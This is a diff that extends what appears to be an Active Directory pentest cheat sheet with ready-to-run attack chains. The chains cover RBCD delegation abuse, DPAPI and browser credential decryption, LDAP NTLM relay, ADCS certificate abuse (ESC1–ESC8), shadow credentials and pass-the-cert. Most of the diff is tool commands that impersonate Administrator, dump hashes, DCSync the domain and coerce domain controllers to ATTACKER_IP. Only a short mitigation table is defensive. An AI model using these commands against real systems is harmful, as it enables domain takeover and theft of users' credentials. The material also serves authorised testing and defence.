@@ -347,6 +347,54 @@ GetUserSPNs.py -dc-ip DC_IP DOMAIN/USER:PASS -request-user TARGET_USER
 Set-DomainObject -Credential $Cred -Identity TARGET_USER -Clear serviceprincipalname -Verbose
 ```
 
+### RBCD — Resource-Based Constrained Delegation
+**When:** You have `GenericWrite`, `GenericAll`, or `WriteDACL` over a computer object (BloodHound: "Find Computers where the Current User has Write Privileges"). Lets you impersonate ANY user (including DA) to that computer.
+**Why:** Writing to `msDS-AllowedToActOnBehalfOfOtherIdentity` tells AD to let a controlled service account perform S4U delegation — request tickets as anyone for any service on the target machine.
+
+```bash
+# Step 1: Create a fake computer account (any domain user can add up to ms-DS-MachineAccountQuota — default 10)
+addcomputer.py -computer-name 'EVILPC$' -computer-pass 'Pwn3d!' -dc-host DC01 \
+  -domain-netbios DOMAIN 'DOMAIN/USER:PASS'
+
+# Step 2: Write the fake computer's SID into the target computer's RBCD attribute
+rbcd.py -delegate-from 'EVILPC$' -delegate-to 'TARGET_COMP$' -action 'write' \
+  'DOMAIN/USER:PASS' -dc-ip DC_IP
+
+# Step 3: S4U2Self + S4U2Proxy — request a ticket as any user (Administrator) for any service on TARGET
+getST.py -spn 'cifs/TARGET_COMP.DOMAIN.LOCAL' -impersonate Administrator \
+  'DOMAIN/EVILPC$:Pwn3d!' -dc-ip DC_IP
+
+# Step 4: Use the ticket → SYSTEM-equivalent access to TARGET
+export KRB5CCNAME=Administrator@cifs_TARGET_COMP.DOMAIN.LOCAL@DOMAIN.LOCAL.ccache
+psexec.py -k -no-pass TARGET_COMP.DOMAIN.LOCAL    # interactive SYSTEM shell
+wmiexec.py -k -no-pass TARGET_COMP.DOMAIN.LOCAL
+secretsdump.py -k -no-pass TARGET_COMP.DOMAIN.LOCAL   # dump SAM/LSA
+
+# Cleanup (clear the RBCD attribute after):
+rbcd.py -delegate-to 'TARGET_COMP$' -action 'flush' 'DOMAIN/USER:PASS' -dc-ip DC_IP
+```
+
+**From Windows (PowerView + Rubeus):**
+```powershell
+# Step 1: Add fake computer:
+. .\Powermad.ps1
+New-MachineAccount -MachineAccount EVILPC -Password $(ConvertTo-SecureString 'Pwn3d!' -AsPlainText -Force)
+
+# Step 2: Get its SID:
+$ComputerSid = Get-DomainComputer EVILPC -Properties objectsid | Select -Expand objectsid
+
+# Step 3: Build the security descriptor and write it:
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer TARGET_COMP | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+# Step 4: S4U with Rubeus:
+.\Rubeus.exe hash /password:Pwn3d! /user:EVILPC /domain:DOMAIN.LOCAL  # get RC4 hash
+.\Rubeus.exe s4u /user:EVILPC$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/TARGET_COMP.DOMAIN.LOCAL /ptt
+ls \\TARGET_COMP\C$
+```
+
 ### ACL Abuse — Take Over Other Accounts
 **When:** BloodHound shows you have GenericAll, ForceChangePassword, GenericWrite, WriteDACL, or WriteOwner on another account or group.
 
@@ -457,6 +505,71 @@ sekurlsa::tickets           # list Kerberos tickets in memory
 
 # Method 3: Remote via secretsdump (if you have admin SMB access):
 secretsdump.py DOMAIN/USER:PASS@HOST   # dumps SAM + LSA Secrets
+```
+
+### DPAPI — Decrypt Saved Credentials
+**When:** You have user-context code execution and want their stored passwords: browser saved logins, RDP/PuTTY cached creds, Wi-Fi passwords, Outlook profiles, mapped drive credentials.
+**Why:** Windows DPAPI encrypts these with a key derived from the user's password + master key. Anyone with the user's password (or hash, or DPAPI domain backup key) can decrypt.
+
+**Locations of encrypted blobs:**
+```
+%APPDATA%\Microsoft\Credentials\           ← Credential Manager
+%LOCALAPPDATA%\Microsoft\Credentials\
+%APPDATA%\Microsoft\Protect\<SID>\         ← Master keys (named by GUID)
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data   ← Chrome creds (SQLite)
+%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt   ← bonus
+```
+
+**With user's plaintext password (Linux):**
+```bash
+# 1. Pull master keys + credentials from target via SMB/wmiexec
+# 2. Decrypt master key with user's password:
+dpapi.py masterkey -file MASTERKEY_FILE -password USER_PASSWORD
+# Outputs the master key hex — save it
+
+# 3. Use master key to decrypt a stored credential:
+dpapi.py credential -file CREDENTIAL_FILE -key 0xMASTERKEY_HEX
+# Reveals: TargetName, Username, Password
+```
+
+**With Mimikatz (Windows):**
+```powershell
+# Enumerate Credential Manager blobs:
+vault::list                                    # all vault credentials
+vault::cred /patch                             # decrypt vault entries
+
+# Decrypt user-protected DPAPI blob:
+dpapi::cred /in:"C:\Users\USER\AppData\Local\Microsoft\Credentials\BLOB_GUID"
+# If you have the master key already in memory (after sekurlsa::logonpasswords), it auto-decrypts
+
+# Get the user's master key:
+sekurlsa::dpapi                                # extracts master keys from LSASS
+
+# Decrypt with explicit master key:
+dpapi::masterkey /in:MASTERKEY_FILE /password:USER_PASSWORD
+dpapi::masterkey /in:MASTERKEY_FILE /sid:USER_SID /password:USER_PASSWORD
+```
+
+**Domain Backup Key — Decrypt ANY User's DPAPI Data (DA required to extract):**
+```bash
+# Step 1: From a DA shell, extract the domain DPAPI backup key:
+.\mimikatz.exe "lsadump::backupkeys /system:DC_FQDN /export"
+# Saves: ntds_legacy_0_*.pvk file
+
+# Step 2: Use the backup key to decrypt ANY user's master keys (no password needed):
+dpapi.py masterkey -file VICTIM_MASTERKEY -pvk DOMAIN_BACKUP.pvk
+
+# This is gold for post-DA persistence — you can decrypt any user's saved creds without their password.
+```
+
+**Chrome / Edge browser passwords:**
+```powershell
+# Mimikatz one-shot (if you have master key):
+dpapi::chrome /in:"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /unprotect
+
+# SharpChrome (clean output):
+.\SharpChrome.exe logins
+.\SharpChrome.exe cookies
 ```
 
 ### SAM / Registry Hives — Local Account Hashes
@@ -592,6 +705,45 @@ sudo responder -I ens224 -wf
 # Targets.txt = list of IPs with SMB signing disabled
 ```
 
+**Find relay-able SMB targets:**
+```bash
+crackmapexec smb 10.0.0.0/24 --gen-relay-list relay_targets.txt
+# Produces a file of hosts with signing:False — feed straight to ntlmrelayx -tf
+```
+
+### LDAP Relay — When SMB Signing Is On But LDAP Isn't
+**When:** SMB signing is enforced (you can't SMB-relay) but LDAP signing/channel binding is NOT enforced on the DC. Default until 2023 patches — still common in unpatched environments.
+**Why:** LDAP is the management protocol for AD. Relaying an authenticated user's NTLM to LDAP lets you add yourself to groups, set SPNs (Kerberoast), or grant DCSync rights — without ever cracking a hash.
+
+```bash
+# Check if LDAP signing is required (and LDAPS channel binding):
+crackmapexec ldap DC_IP -u USER -p PASS                              # plain ldap
+# Look for: "[+] DOMAIN\USER:PASS" with "Signing:False"
+# Or use nmap:
+nmap -p 636 --script ldap-bindpolicy DC_IP
+
+# Relay to LDAP (no encryption required):
+ntlmrelayx.py -t ldap://DC_IP --escalate-user pwneduser --no-validate-pac
+# --escalate-user = grants this user DCSync rights via WriteDACL on domain object
+
+# Relay to LDAPS (TLS) — bypasses signing but blocked by channel binding (EPA):
+ntlmrelayx.py -t ldaps://DC_IP --escalate-user pwneduser
+
+# Other ldap relay actions:
+ntlmrelayx.py -t ldap://DC_IP --add-computer EVILPC   # add a controlled computer account
+ntlmrelayx.py -t ldap://DC_IP --delegate-access -tn TARGET_COMP$   # set up RBCD on a computer
+
+# Trigger with PetitPotam → coerce DC$ → relay to LDAPS → set RBCD on DC → S4U → DA
+python3 PetitPotam.py ATTACKER_IP DC_IP
+```
+
+**Signing / Channel Binding status — Quick Recon:**
+```bash
+# LDAPSearch sanity check — if you can read but the DC requires signing, attempts fail:
+crackmapexec ldap DC_IP -u USER -p PASS -M ldap-checker
+# Outputs: LDAP signing required? LDAPS channel binding required?
+```
+
 ### Privileged Access — Getting Shells
 
 ```bash
@@ -646,26 +798,117 @@ python3 CVE-2021-1675.py DOMAIN/USER:PASS@HOST '\\ATTACKER_IP\share\malicious.dl
 crackmapexec smb HOST -u USER -p PASS -M spooler
 ```
 
-### PetitPotam + ADCS — Force DC to Authenticate → DA
-**When:** ADCS (Certificate Services) web enrollment is running and vulnerable, and you can reach the DC.
-**Why:** Coerce DC01 to authenticate to you, relay that to ADCS to get a certificate for DC01$, then use the cert to get DA.
+### ADCS Attacks — Certificate Services Abuse (ESC1–ESC11)
+**When:** AD Certificate Services is deployed. Certipy is THE tool — enumerate templates first, then pick the ESC that matches.
+**Why:** Misconfigured certificate templates let any domain user request a cert that authenticates them as any user, including DA.
+
+#### Step 1 — Enumerate (always start here)
+```bash
+# Linux — Certipy:
+certipy find -u USER@DOMAIN -p PASS -dc-ip DC_IP -vulnerable -stdout
+# -vulnerable = filter to only show exploitable misconfigs
+# -stdout = print to terminal (also saves .json, .txt, .zip)
+
+# Windows — Certify:
+.\Certify.exe find /vulnerable
+.\Certify.exe find /enrolleeSuppliesSubject     # ESC1 specifically
+.\Certify.exe cas                                # list Certificate Authorities
+```
+
+#### ESC1 — Template Allows SAN + Client Auth
+**Indicators:** `mspki-certificate-name-flag = 1` (ENROLLEE_SUPPLIES_SUBJECT) + Client Auth EKU + Domain Users enrollment rights.
 
 ```bash
-# Step 1: Start ntlmrelayx to relay to ADCS:
+# Request cert as Administrator:
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
+  -template VulnTemplate -upn 'administrator@domain.local'
+# Outputs administrator.pfx
+
+# Authenticate with the cert → get TGT + NT hash:
+certipy auth -pfx administrator.pfx -domain DOMAIN.LOCAL
+# Returns: administrator's NTLM hash → PtH to DA
+```
+
+#### ESC2 — Template Allows Any Purpose / SubCA EKU
+Same exploitation flow as ESC1 — request cert specifying a target user via UPN.
+
+#### ESC3 — Enrollment Agent Template
+**Indicators:** Template has Certificate Request Agent EKU + low-priv users can enroll.
+```bash
+# Step 1: Get the enrollment agent cert as yourself:
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST -template EnrollmentAgent
+# Step 2: Use it to request a cert ON BEHALF OF administrator:
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
+  -template User -on-behalf-of 'DOMAIN\administrator' -pfx agent.pfx
+```
+
+#### ESC4 — Vulnerable Template ACL (you can modify template)
+**Indicators:** BloodHound shows `GenericAll`/`WriteDacl`/`WriteOwner` on a template.
+```bash
+# Backup current config → make it vulnerable → exploit → restore:
+certipy template -u USER@DOMAIN -p PASS -template VulnTemplate -save-old
+certipy template -u USER@DOMAIN -p PASS -template VulnTemplate    # makes it ESC1
+# Now exploit as ESC1, then:
+certipy template -u USER@DOMAIN -p PASS -template VulnTemplate -configuration old_config.json
+```
+
+#### ESC6 — CA Has EDITF_ATTRIBUTESUBJECTALTNAME2 Set
+**Indicators:** CA flag `EDITF_ATTRIBUTESUBJECTALTNAME2` enabled (lets requester specify SAN on ANY template).
+```bash
+# Any cert request becomes ESC1 — supply -upn:
+certipy req -u USER@DOMAIN -p PASS -ca CA_NAME -target CA_HOST \
+  -template User -upn 'administrator@domain.local'
+```
+
+#### ESC7 — Vulnerable CA ACL (you control the CA)
+**Indicators:** `ManageCA` or `ManageCertificates` rights on the CA itself.
+```bash
+# Add yourself as CA officer, then issue/approve your own certs:
+certipy ca -u USER@DOMAIN -p PASS -ca CA_NAME -add-officer USER
+# Then request a pending cert and approve it yourself
+```
+
+#### ESC8 — HTTP Endpoint Without Signing (PetitPotam → ADCS Relay)
+**When:** ADCS Web Enrollment (`/certsrv`) is running over HTTP/HTTPS without channel binding. Force a privileged account (DC$) to auth → relay to ADCS → get a cert as DC$ → DCSync.
+
+```bash
+# Step 1: Start ntlmrelayx to relay to ADCS HTTP enrollment:
 ntlmrelayx.py -debug -smb2support --target http://ADCS_HOST/certsrv/certfnsh.asp \
   --adcs --template DomainController
 
 # Step 2: Coerce DC01 to authenticate to us:
 python3 PetitPotam.py ATTACKER_IP DC_IP
-# or: python3 Coercer.py -t DC_IP -l ATTACKER_IP
+# or: python3 Coercer.py coerce -u USER -p PASS -t DC_IP -l ATTACKER_IP
+# or: python3 printerbug.py DOMAIN/USER:PASS@DC_IP ATTACKER_IP
 
-# Step 3: Got a certificate — use it for Kerberos auth:
-python3 gettgtpkinit.py -pfx-base64 CERTIFICATE DOMAIN/DC01\$ dc01.ccache
-export KRB5CCNAME=dc01.ccache
+# Step 3: ntlmrelayx outputs a base64 PFX for DC01$ — save it
+# Step 4: Authenticate with the cert as DC01$ → get TGT:
+certipy auth -pfx dc01.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
+# Returns DC01$ NT hash
 
-# Step 4: Use the DC machine account TGT to get DA hash:
-python3 getnthash.py -key AES_KEY DOMAIN/DC01\$
-secretsdump.py -just-dc -k DOMAIN/DC01\$@DC_IP
+# Step 5: DCSync with DC machine account:
+secretsdump.py -hashes :DC01_HASH 'DOMAIN/DC01$@DC_IP' -just-dc
+# Dumps krbtgt + every domain user
+```
+
+#### Certipy Shadow Credentials (msDS-KeyCredentialLink Abuse)
+**When:** You have `GenericWrite` / `GenericAll` on a target user/computer. Lets you add a key credential and authenticate as them via PKINIT.
+
+```bash
+certipy shadow auto -u USER@DOMAIN -p PASS -account TARGET_USER
+# Adds a fake device cred, requests TGT as TARGET_USER, dumps their NT hash, then removes the cred
+# One-shot: ACL abuse → user takeover without changing their password
+```
+
+### Pass-the-Cert (PKINIT)
+```bash
+# If you have a .pfx (from any ESC) → get TGT and NT hash:
+certipy auth -pfx user.pfx -domain DOMAIN.LOCAL -dc-ip DC_IP
+
+# Alternative: gettgtpkinit (PKINITtools — manual chain):
+python3 gettgtpkinit.py -cert-pfx cert.pfx -pfx-pass '' DOMAIN/USER user.ccache
+export KRB5CCNAME=user.ccache
+python3 getnthash.py -key AES_KEY_FROM_GETTGT DOMAIN/USER
 ```
 
 ---
@@ -939,6 +1182,11 @@ Checks include: stale accounts, weak password policies, anonymous access, vulner
 | NoPac | Patch CVE-2021-42278/42287, set `ms-DS-MachineAccountQuota=0` |
 | GPO Abuse | Restrict GPO write rights to T0 admins only |
 | ACL Abuse | Regular ACL audits, BloodHound from defender perspective |
+| RBCD | Set `ms-DS-MachineAccountQuota=0`, audit `msDS-AllowedToActOnBehalfOfOtherIdentity` writes (Event 5136) |
+| ADCS ESC1-ESC8 | Patch CVE-2022-26923, disable `EDITF_ATTRIBUTESUBJECTALTNAME2`, enforce manager approval, audit template ACLs |
+| LDAP relay | Enforce LDAP signing + LDAPS channel binding (EPA) — Microsoft default since 2023 patches |
+| DPAPI extraction | Credential Guard, no saved browser passwords, monitor backup key exports (Event 4662 on Policy Secrets) |
+| Shadow Credentials | Monitor `msDS-KeyCredentialLink` writes, deny non-admins WriteProperty on this attribute |
 | ExtraSids trust | Enable SID Filtering on cross-domain trusts |
 
 ---
